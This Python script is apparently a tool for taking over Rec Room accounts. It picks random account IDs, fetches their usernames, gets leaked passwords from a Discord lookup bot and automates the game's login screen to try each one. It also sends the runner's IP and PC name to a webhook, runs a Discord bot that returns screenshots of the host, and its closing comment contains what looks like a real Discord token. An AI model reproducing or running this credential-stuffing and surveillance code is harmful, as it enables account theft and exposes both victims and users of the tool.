from keyauth import api

import sys
import platform
import os
import random
import pyautogui
import hashlib
from PIL import Image
from colorama import init, Style, Fore
import time
import psutil
import json
import cv2
import shutil
from time import sleep
from datetime import datetime
import numpy as np
import win32gui
import pyperclip
import keyboard
import requests
import socket
import discord
from discord.ext import commands
import pyautogui
import io
import aiohttp
import logging


init()

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

pcs = {socket.gethostname(): socket.gethostname()}

@bot.command(name='pcs')
async def list_pcs(ctx):
    pc_list = '\n'.join(pcs.keys())
    await ctx.send(f"Available PCs:\n{pc_list}")

@bot.command(name='ss')
async def screenshot(ctx, pc_name: str):
    local_pc_name = socket.gethostname()
    
    if pc_name == local_pc_name:
        screenshot = pyautogui.screenshot()
        image_stream = io.BytesIO()
        screenshot.save(image_stream, format='PNG')
        image_stream.seek(0)
        
        await ctx.send(file=discord.File(fp=image_stream, filename="screenshot.png"))
    else:
        await ctx.send(f"PC '{pc_name}' not found or not available for screenshots.")

WebHook = "Add Your Webhook Here"

def GrabIP():
    try:
        response = requests.get("https://ipapi.co/ip/")
        response.raise_for_status()
        public_ip = response.text.strip()
        return public_ip
    except requests.RequestException as e:
        print(f"Error fetching IP: {e}")
        return None

def GrabPCName():
    return socket.gethostname()

async def SendMessage(ip, pc_name):
    payload = {
        "content": f"\n**Somebody Ran The AutoPuller** ```IP Address: {ip}\nPC Name: {pc_name}```"
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(WebHook, json=payload) as response:
                if response.status != 204:
                    print(f"Error sending message: {response.status}")
    except Exception as e:
        print(f"Error sending the sigma message: {e}")


def set_console_width(width):
    current_size = shutil.get_terminal_size()
    new_size = (width, current_size.lines)
    if platform.system() == 'Windows':
        os.system(f'mode con: cols={new_size[0]} lines={new_size[1]}')
    elif platform.system() in ('Linux', 'Darwin'):
        sys.stdout.write(f"\x1b[8;{new_size[1]};{new_size[0]}t")

def clear():
    if platform.system() == 'Windows':
        os.system('cls & title Carpets AutoPuller')
    elif platform.system() in ('Linux', 'Darwin'):
        os.system('clear')
        sys.stdout.write("\x1b]0;Carpets AutoPuller\x07")

def getchecksum():
    md5_hash = hashlib.md5()
    with open(''.join(sys.argv), "rb") as file:
        md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest

#CHANGE THESE

keyauthapp = api(
    name="ApplicationName",
    ownerid="YourOwnerID",
    secret="YourSecretHere",
    version="1.0",
    hash_to_check=getchecksum()
)

def answer():
    try:
        while True:
            clear()
            print("""1. Login
2. Register
            """)
            ans = input("Select Option: ")
            if ans == "1":
                clear()
                user = input('Provide username: ')
                clear()
                password = input('Provide password: ')
                time.sleep(1)
                clear()
                keyauthapp.login(user, password)
                break
            elif ans == "2":
                clear()
                user = input('Provide username: ')
                clear()
                password = input('Provide password: ')
                clear()
                license = input('Provide License: ')
                clear()
                keyauthapp.register(user, password, license)
                break
            else:
                print("\nInvalid option")
                sleep(1)
    except KeyboardInterrupt:
        os._exit(1)

answer()

clear()
set_console_width(88)

init(autoreset=True)

def GetWebhookUrl():
    file_path = os.path.join(os.path.dirname(__file__), 'WebhookUrl.txt')
    with open(file_path, 'r') as file:
        WebhookUrl = file.read().strip()
    return WebhookUrl

def SendWebhook():
    WebhookUrl = GetWebhookUrl()
    payload = {
        "content": "||@everyone|| **you have Pulled a Account! (Mango Mango Mango)**"
    }
    response = requests.post(WebhookUrl, json=payload)

    if response.status_code == 200:
        print("Sent Message Successfully!")
    else:
        print(f"Failed to send webhook. Status code: {response.status_code}")

def get_token_and_ids():
    try:
        with open("SavedInformation.txt", "r") as file:
            data = json.load(file)
            use_saved = input(f"Use saved information? (Y/N): ").strip().upper()
            if use_saved == "Y":
                return data["token"], data["serverId"], data["channelId"]
    except FileNotFoundError:
        pass

    token = input("Enter your Discord token: ")
    server_id = input("Enter the Server ID: ")
    channel_id = input("Enter the Channel ID: ")

    save_data = input(f"Do you want to save this information for next time? (Y/N): ").strip().upper()
    if save_data == "Y":
        with open("SavedInformation.txt", "w") as file:
            json.dump({"token": token, "serverId": server_id, "channelId": channel_id}, file)

    return token, server_id, channel_id


def fetch_username_from_id(user_id):
    url = f"https://apim.rec.net/accounts/account/{user_id}/"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            return data.get("username")
        return None
    except Exception as e:
        print(f"{Fore.RED}Error fetching username: {e}")
        return None

def send_message(token, channel_id, message):
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    payload = {
        "content": message
    }
    
    response = requests.post(url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print(f"{Fore.GREEN}Message sent successfully: {message}")
        return response.json()
    else:
        print(f"{Fore.RED}Failed to send message. Status code: {response.status_code}")
        return None

def detect_and_click(image_file, threshold=0.7, delay=1):
    print(f"Trying to detect: {image_file}")
    if os.path.exists(image_file):
        screenshot = pyautogui.screenshot()
        screenshot_cv = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
        template = cv2.imread(image_file)

        result = cv2.matchTemplate(screenshot_cv, template, cv2.TM_CCOEFF_NORMED)
        min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(result)

        print(f"Detection confidence for {image_file}: {max_val}")

        if max_val > threshold:
            print(f"{image_file} detected with confidence {max_val}")
            x, y = max_loc
            pyautogui.moveTo(x + template.shape[1] // 2, y + template.shape[0] // 2)
            pyautogui.click()
            time.sleep(delay)
            return True
        else:
            print(f"{image_file} not detected (confidence {max_val})")
    else:
        print(f"{image_file} not found on disk.")
    return False

def paste_text(text):
    pyperclip.copy(text)
    pyautogui.hotkey("ctrl", "v")
    time.sleep(0.5)

def get_latest_message(token, channel_id):
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=1"
    headers = {
        "Authorization": token
    }
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            messages = response.json()
            if messages:
                return messages[0]["content"]
        else:
            print(f"{Fore.RED}Failed to fetch messages. Status code: {response.status_code}")
    except Exception as e:
        print(f"{Fore.RED}Error fetching message: {e}")
    return None

def clean_response(response):
    cleaned_response = response.strip().replace("`", "").replace('"', "")
    return cleaned_response

def handle_switch_and_plus():
    dots_detected = detect_and_click("Dots.png")
    switch_detected = detect_and_click("Switch.png")

    if dots_detected:
        SendWebhook()
        print(f"{Fore.GREEN}Dots.png detected.")
    else:
        print(f"{Fore.RED}Dots.png not detected.")

    if switch_detected:
        SendWebhook()
        print(f"{Fore.GREEN}Switch.png detected.")
    else:
        print(f"{Fore.RED}Switch.png not detected.")

    if dots_detected or switch_detected:
        time.sleep(1)
        if detect_and_click("Plus.png"):
            print(f"{Fore.GREEN}Plus.png detected and clicked.")
        else:
            print(f"{Fore.RED}Plus.png not detected.")


def handle_retry_click():
    if detect_and_click("Retry.png"):
        print(f"{Fore.GREEN}Retry.png detected and clicked.")
        time.sleep(4)
        handle_switch_and_plus()
        return True
    else:
        print(f"{Fore.YELLOW}Retry.png not detected.")
        return False


def automation(token, server_id, channel_id, year):
    min_max_ids = {
        "2016": (5, 69723),
        "2017": (69724, 386114),
        "2018": (386115, 1290001),
        "2019": (1290002, 3314552),
        "2020": (3314553, 11159630)
    }

    if year not in min_max_ids:
        print(f"{Fore.RED}Invalid year. Please enter a valid year between 2016 and 2020.")
        return

    try:
        max_passwords_to_try = int(input("Enter the number of passwords to try for each ID: ").strip())
    except ValueError:
        print(f"{Fore.RED}Invalid number entered.")
        return

    while True:
        if keyboard.is_pressed('esc'):
            print(Fore.RED + "Exiting AutoPuller.")
            break

        min_id, max_id = min_max_ids[year]
        random_id = random.randint(min_id, max_id)

        username = None
        while username is None:
            username = fetch_username_from_id(random_id)
            if username is None:
                print(f"{Fore.YELLOW}ID {random_id} is not valid. Trying again...")
                random_id = random.randint(min_id, max_id)

        if "Guest" in username or "User" in username:
            print(f"{Fore.YELLOW}Skipping ID {random_id}. Username '{username}' contains 'Guest' or 'User'.")
            random_id = random.randint(min_id, max_id)
            continue

        print(f"{Fore.GREEN}Valid ID! Username: {username}")

        username_detected = False
        for attempt in range(3):
            if detect_and_click("username.png"):
                pyautogui.hotkey("ctrl", "a")
                pyautogui.press("backspace")
                time.sleep(0.5)
                paste_text(username)
                username_detected = True
                break
            else:
                print(f"{Fore.YELLOW}Attempt {attempt + 1}: username.png not detected. Retrying...")
                handle_retry_click()
                handle_switch_and_plus()
                time.sleep(1)

        if not username_detected:
            print(Fore.RED + "Failed to detect username field after multiple attempts.")
            continue

        if detect_and_click("password.png"):
            print(f"{Fore.GREEN}Password field clicked.")
            message = f"-c {username}"
            response = send_message(token, channel_id, message)

            time.sleep(5)

            latest_response = get_latest_message(token, channel_id)
            if latest_response:
                cleaned_response = clean_response(latest_response)

                if cleaned_response.endswith('.txt'):
                    print(f"{Fore.RED}Received a text file response. Skipping this ID.")
                    continue
                else:
                    passwords = cleaned_response.split('\n')
                    cleaned_passwords = list(set([pwd.strip() for pwd in passwords if pwd.strip()]))
                    
                    passwords_to_try = cleaned_passwords[:max_passwords_to_try]

                    if passwords_to_try:
                        for password in passwords_to_try:
                            if len(password) < 8:
                                print(f"{Fore.YELLOW}Password '{password}' is too short. Skipping.")
                                continue
                            
                            if detect_and_click("password.png"):
                                print(f"{Fore.GREEN}Pasting password: {password}")
                                pyautogui.hotkey("ctrl", "a")
                                pyautogui.press("backspace")
                                time.sleep(0.5)
                                paste_text(password)

                                if detect_and_click("play.png"):
                                    print(Fore.GREEN + "Clicked Play button.")
                                    time.sleep(4)
                                    
                                    handle_switch_and_plus()

                        print(f"{Fore.YELLOW}Tried all passwords for ID: {random_id}. Moving to next ID...")
                    else:
                        print(f"{Fore.RED}No valid passwords received from Kyanite.")
            else:
                print(f"{Fore.RED}Kyanite did not respond with a valid message.")

        time.sleep(1)

if __name__ == "__main__":
    token, server_id, channel_id = get_token_and_ids()
    clear()
    print(Fore.BLUE + """  
  ______               __                _______             __  __                     
 /      \             |  \              |       \           |  \|  \                    
|  $$$$$$\ __    __  _| $$_     ______  | $$$$$$$\ __    __ | $$| $$  ______    ______  
| $$__| $$|  \  |  \|   $$ \   /      \ | $$__/ $$|  \  |  \| $$| $$ /      \  /      \ 
| $$    $$| $$  | $$ \$$$$$$  |  $$$$$$\| $$    $$| $$  | $$| $$| $$|  $$$$$$\|  $$$$$$\
| $$$$$$$$| $$  | $$  | $$ __ | $$  | $$| $$$$$$$ | $$  | $$| $$| $$| $$    $$| $$   \$$
| $$  | $$| $$__/ $$  | $$|  \| $$__/ $$| $$      | $$__/ $$| $$| $$| $$$$$$$$| $$      
| $$  | $$ \$$    $$   \$$  $$ \$$    $$| $$       \$$    $$| $$| $$ \$$     \| $$      
 \$$   \$$  \$$$$$$     \$$$$   \$$$$$$  \$$        \$$$$$$  \$$ \$$  \$$$$$$$ \$$      
                              #cracked #2behindert #Cl4vr #Skitzo1337 #                                                          
                                                                                        
                                                                                        """)
    year = input("Enter the year (2016 to 2020): ").strip()
    automation(token, server_id, channel_id, year)
    # Change THis To a Discord bot 
    bot.run('TokenHere')
    wait(1.5)
    clear()

    # Carpets Discord Bot Token Or his Account Token MTI5MDgyNzEyNTM0MzEyOTYzMQ.GjDRHF.th2wrVzG5NfBv-2xzZPgSVElrR5NEV2rcjfYQ0